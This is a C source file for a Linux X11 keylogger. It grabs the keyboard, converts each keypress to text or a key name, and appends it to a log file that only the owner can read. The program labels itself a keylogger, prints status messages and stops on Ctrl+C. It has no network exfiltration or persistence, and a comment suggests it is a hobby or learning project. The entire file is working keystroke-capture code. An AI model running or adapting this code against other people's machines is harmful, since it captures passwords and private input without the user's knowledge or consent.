#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/Xutil.h>
#include <unistd.h>
#include <sys/stat.h>

// Global variables
Display *display = NULL;
FILE *file = NULL;
int running = 1;


void cleanup() {
    if (file != NULL) {
        fclose(file);
        printf("Log file closed.\n");
    }
    if (display != NULL) {
        XCloseDisplay(display);
        printf("X display closed.\n");
    }
    printf("Program exited cleanly.\n");
}

//No idea why this still doesn't workkkk'
void handle_signal(int signal) {
    printf("\nSignal %d received. Cleaning up and exiting...\n", signal);
    running = 0;  // Stop the main loop
}


void log_key(const char *key) {
    if (file != NULL) {
        if (fprintf(file, "%s\n", key) < 0) {
            perror("Error writing to file");
        }
        fflush(file);
    }
}

int main(int argc, char *argv[]) {
    Window root;
    XEvent event;
    char *log_file_path = (argc > 1) ? argv[1] : "keylog.txt";


    display = XOpenDisplay(NULL);
    if (display == NULL) {
        fprintf(stderr, "Unable to open X display\n");
        return 1;
    }


    root = DefaultRootWindow(display);


    XSelectInput(display, root, KeyPressMask | KeyReleaseMask);


    if (XGrabKeyboard(display, root, True, GrabModeAsync, GrabModeAsync, CurrentTime) != GrabSuccess) {
        fprintf(stderr, "Failed to grab keyboard\n");
        XCloseDisplay(display);
        return 1;
    }


    file = fopen(log_file_path, "a");
    if (file == NULL) {
        perror("Error opening log file");
        XCloseDisplay(display);
        return 1;
    }


    chmod(log_file_path, S_IRUSR | S_IWUSR); // Owner read/write only

    printf("Keylogger started. Logging to '%s'. Press Ctrl+C to exit.\n", log_file_path);


    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);


    atexit(cleanup);


    while (running) {
        if (XPending(display) > 0) {
            XNextEvent(display, &event);

            if (event.type == KeyPress) {
                char buffer[128] = {0};
                KeySym keysym;
                int len = XLookupString(&event.xkey, buffer, sizeof(buffer), &keysym, NULL);

                if (len > 0) {
                    log_key(buffer);
                } else if (keysym != NoSymbol) {
                    const char *keysym_str = XKeysymToString(keysym);
                    if (keysym_str != NULL) {
                        log_key(keysym_str);
                    }
                }
            }
        } else {
            usleep(5000);
        }
    }

    return 0;
}
